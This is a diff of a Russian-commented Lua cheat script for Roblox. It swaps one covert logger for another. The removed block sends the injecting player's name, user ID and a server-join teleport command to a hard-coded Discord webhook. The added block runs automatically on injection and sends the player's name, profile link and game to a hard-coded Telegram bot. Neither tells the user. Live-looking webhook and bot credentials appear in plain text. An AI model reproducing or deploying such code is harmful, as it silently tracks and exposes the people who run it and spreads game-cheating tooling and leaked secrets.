@@ -8706,93 +8706,70 @@ task.spawn(function()
     end
 end)
 
--- ================= CONFIGURATION =================
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1552404669937221782/2q5Is8VdrBHzeBhUvEz2Xkmrpk0G59uavfER4Maj71YFOnVQmdK6bxU96FQxtk9J3pM-" -- Вставьте ваш вебхук сюда
-local CUSTOM_AVATAR_URL = "https://i.ytimg.com/vi/RBgjishlsdo/maxresdefault.jpg"      -- Кастомная аватарка для самого бота
-local CUSTOM_NICKNAME = "blueprint(turn)"        -- Кастомный ник для самого бота
--- =================================================
-
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-local MarketplaceService = game:GetService("MarketplaceService")
-
-local LocalPlayer = Players.LocalPlayer
-
--- Получаем реальные данные игрока, который инжектнул скрипт
-local realName = LocalPlayer.Name
-local userId = LocalPlayer.UserId
-local gameId = game.PlaceId
-local jobId = game.JobId
-
--- Аватарка инжектнувшего игрока для красивой миниатюры внутри сообщения
-local playerAvatar = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
-
--- Получаем правильное название игры
-local gameName = "Неизвестная игра"
-pcall(function()
-    local info = MarketplaceService:GetProductInfo(gameId)
-    if info and info.Name then
-        gameName = info.Name
-    end
-end)
-
--- Формируем Discord Embed
-local data = {
-    ["username"] = CUSTOM_NICKNAME,   -- Ник бота (остается из настроек)
-    ["avatar_url"] = CUSTOM_AVATAR_URL, -- Аватарка бота (остается из настроек)
-    ["embeds"] = {
-        {
-            ["title"] = "🎮 Зафиксирован новый инжект!",
-            ["color"] = 65280, -- Зеленый цвет
-            ["fields"] = {
-                {
-                    ["name"] = "👤 Ник инжектнувшего:",
-                    ["value"] = "`" .. realName .. "`",
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "🆔 Roblox ID / Discord ID:",
-                    ["value"] = "`" .. userId .. "`",
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "📌 название игры:",
-                    ["value"] = "**" .. gameName .. "**",
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "🔑 JobId для захода:",
-                    ["value"] = "```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameId .. ", \"" .. jobId .. "\", game.Players.LocalPlayer)\n```",
-                    ["inline"] = false
-                }
-            },
-            ["thumbnail"] = {
-                ["url"] = playerAvatar -- Аватарка игрока в правом углу эмбеда
-            },
-            ["footer"] = {
-                ["text"] = "PlaceID: " .. gameId
-            }
-        }
-    }
-}
-
-local body = HttpService:JSONEncode(data)
-
--- Безопасный запрос на вебхук
-local requestFunction = syn and syn.request or http_request or request
-if requestFunction then
-    requestFunction({
-        Url = WEBHOOK_URL,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = body
-    })
-else
-    pcall(function()
-        HttpService:PostAsync(WEBHOOK_URL, body, Enum.HttpContentType.ApplicationJson)
-    end)
+-- Проверяем поддержку HTTP-запросов эксплойтом
+local httpRequest = http_request or syn and syn.request or request
+if not httpRequest then
+    warn("Ваш эксплойт не поддерживает HTTP-запросы!")
+    return
 end
 
+-- Вшитые данные бота и группы
+local BOT_TOKEN = "9117692807:AAGC3YrEO-2C18emkaogVQgEH6rNDHM9tp0"
+local CHAT_ID = "-5408044934"
+
+-- Сервисы и данные игрока
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local localPlayer = Players.LocalPlayer
+
+-- Получаем название игры
+local success, gameInfo = pcall(function()
+    return MarketplaceService:GetProductInfo(game.PlaceId)
+end)
+local gameName = success and gameInfo.Name or "Неизвестная игра"
+
+-- Функция отправки сообщения
+local function sendToTelegram()
+    local playerName = localPlayer.Name
+    local playerDisplayName = localPlayer.DisplayName
+    local profileUrl = "https://www.roblox.com/users/" .. localPlayer.UserId .. "/profile"
+    
+    local message = string.format(
+        "🚀 *Новый инжект!*\n\n👤 *Игрок:* %s (@%s)\n🔗 *Профиль:* [Ссылка](%s)\n🎮 *Игра:* %s\n🆔 *PlaceID:* %d\n\n`blueprint(turn)`",
+        playerDisplayName,
+        playerName,
+        profileUrl,
+        gameName,
+        game.PlaceId
+    )
+    
+    local url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage"
+    local body = game:GetService("HttpService"):JSONEncode({
+        chat_id = CHAT_ID,
+        text = message,
+        parse_mode = "Markdown"
+    })
+    
+    local success, response = pcall(function()
+        return httpRequest({
+            Url = url,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = body
+        })
+    end)
+    
+    if success and response.Success then
+        print("Уведомление успешно отправлено в группу!")
+    else
+        warn("Ошибка отправки. Убедитесь, что бот добавлен в группу и имеет права на отправку сообщений.")
+    end
+end
+
+-- Автоматический запуск при инжекте
+task.spawn(sendToTelegram)
 
 -- ============================================
 --  Troll Screen + кликабельная картинка
